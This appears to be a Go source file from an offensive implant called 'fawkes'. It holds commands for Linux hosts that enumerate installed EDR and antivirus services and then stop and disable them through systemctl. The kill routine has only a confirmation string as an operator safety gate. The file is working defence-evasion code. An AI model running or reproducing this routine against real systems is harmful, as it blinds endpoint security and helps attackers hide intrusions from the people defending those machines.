//go:build linux

package commands

import (
	"fmt"
	"os/exec"
	"strings"

	"fawkes/pkg/structs"
)

// serviceEdrEnumLinux enumerates EDR/AV services on Linux via systemctl.
func serviceEdrEnumLinux() structs.CommandResult {
	candidates := edrMatchesForPlatform("linux")
	var results []edrEnumResult

	for _, entry := range candidates {
		// Check if unit exists and get its status
		out, err := exec.Command("systemctl", "is-active", entry.ServiceName).CombinedOutput()
		status := strings.TrimSpace(string(out))

		if err != nil && status == "" {
			continue // Service not installed
		}

		// Map systemctl status to our standard status
		switch status {
		case "active":
			status = "running"
		case "inactive":
			status = "stopped"
		case "failed":
			status = "stopped"
		default:
			// "unknown" or other states — could mean not installed
			if status == "unknown" {
				continue
			}
		}

		results = append(results, edrEnumResult{
			ServiceName: entry.ServiceName,
			Vendor:      entry.Vendor,
			Product:     entry.Product,
			Status:      status,
		})
	}

	return successResult(formatEdrEnumResults(results))
}

// serviceEdrKillLinux attempts to stop and disable detected EDR/AV services via systemctl.
func serviceEdrKillLinux(args serviceArgs) structs.CommandResult {
	if strings.ToUpper(args.Confirm) != "EDR-KILL" {
		return errorResult("Error: EDR-KILL requires -confirm EDR-KILL safety gate. This will attempt to stop and disable security services.")
	}

	candidates := edrMatchesForPlatform("linux")
	var sb strings.Builder
	sb.WriteString("[*] EDR/AV Service Kill Results:\n\n")

	killed := 0
	failed := 0

	for _, entry := range candidates {
		// Check if active
		out, _ := exec.Command("systemctl", "is-active", entry.ServiceName).CombinedOutput()
		status := strings.TrimSpace(string(out))
		if status != "active" {
			continue
		}

		// Stop the service
		stopOut, stopErr := exec.Command("systemctl", "stop", entry.ServiceName).CombinedOutput()

		// Disable the service
		disableOut, disableErr := exec.Command("systemctl", "disable", entry.ServiceName).CombinedOutput()

		if stopErr != nil {
			sb.WriteString(fmt.Sprintf("  [!] %s (%s): STOP FAILED — %s\n", entry.ServiceName, entry.Product, strings.TrimSpace(string(stopOut))))
			failed++
		} else if disableErr != nil {
			sb.WriteString(fmt.Sprintf("  [~] %s (%s): STOPPED but disable failed — %s\n", entry.ServiceName, entry.Product, strings.TrimSpace(string(disableOut))))
			killed++
		} else {
			sb.WriteString(fmt.Sprintf("  [+] %s (%s): STOPPED + DISABLED\n", entry.ServiceName, entry.Product))
			killed++
		}
	}

	if killed == 0 && failed == 0 {
		sb.WriteString("  No running EDR/AV services found to stop.\n")
	} else {
		sb.WriteString(fmt.Sprintf("\n  Summary: %d stopped, %d failed\n", killed, failed))
	}

	return successResult(sb.String())
}
